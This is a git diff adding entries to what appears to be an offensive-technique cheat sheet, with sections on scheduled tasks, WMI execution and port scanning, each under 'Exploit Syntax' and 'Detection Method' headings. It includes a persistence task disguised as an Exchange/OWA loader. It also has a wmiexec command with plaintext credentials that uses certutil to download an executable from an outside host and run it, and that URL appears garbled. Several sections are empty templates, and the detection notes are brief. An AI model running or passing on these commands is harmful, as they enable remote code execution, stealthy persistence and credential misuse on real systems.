@@ -47,12 +47,104 @@
 
 ## Job Scheduling
 
+### Exploit Syntax
+
+* Method 1 | `sharpps` [ UNTESTED ]
+
 ```powershell 
-SCHTASKS /CREATE /SC DAILY /TN "MyTasks\Notepad task" /TR "Path to the executable you want to run" /ST 11:00
+sharpps SCHTASKS /CREATE /SC DAILY /TN "MyTasks\Notepad task" /TR "Path to the executable you want to run" /ST 11:00
 ```
+* Method 2 | `pslo`
+
+```powershell
+$outpath = "D:\Exchange Server\FIP-FS\Bin\ScanEngineLoader.exe"
+$action = New-ScheduledTaskAction -Execute $outpath
+$days = 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday'
+$trigger = New-ScheduledTaskTrigger -weekly -DaysOfWeek $days -At 9am
+Register-ScheduledTask -Action $action -Trigger $trigger -Taskname "Engine Loader" -Description "This task loads resouces for OWA."
+```
+
+### Detection Method
+
+* Investigate file creations in the default windows task folder - C:\Windows\System32\Tasks folder.
+    * Event.code: 1 
+    * Event.action: process create 
+    * Event.code: 4698 or 4699
+ 
+
+### Resources
+
+---
+
+## Windows Managment Instrumentation
 
 ### Exploit Syntax
 
+```powershell 
+wmiexec -t 172.25.47.2 -u aubrey.sandoval -d vcfed-int -p f7m.}K+s-h -c "cmd /c certutil.exe -urlcache -split -f http://downgradesystems.info/quhttp://10.10.254.1:46692/file-transfer/aspect-remind-lawestions/61882772/verify %APPDATA%\7zip.exe && %APPDATA%\7zip.exe"
+```
+
+### Detection Method
+### Resources
+
+---
+
+## Network Service Scanning
+
+### Exploit Syntax
+
+```powershell 
+portscan <ipaddress> -Ports “<port range ex.‘1-100’>
+```
+
+### Detection Method
+### Resources
+
+---
+
+## Title
+
+### Exploit Syntax
+### Detection Method
+### Resources
+
+---
+
+## Title
+
+### Exploit Syntax
+### Detection Method
+### Resources
+
+---
+
+## Title
+
+### Exploit Syntax
+### Detection Method
+### Resources
+
+---
+
+## Title
+
+### Exploit Syntax
+### Detection Method
+### Resources
+
+---
+
+## Title
+
+### Exploit Syntax
+### Detection Method
+### Resources
+
+---
+
+## Title
+
+### Exploit Syntax
 ### Detection Method
 ### Resources
 
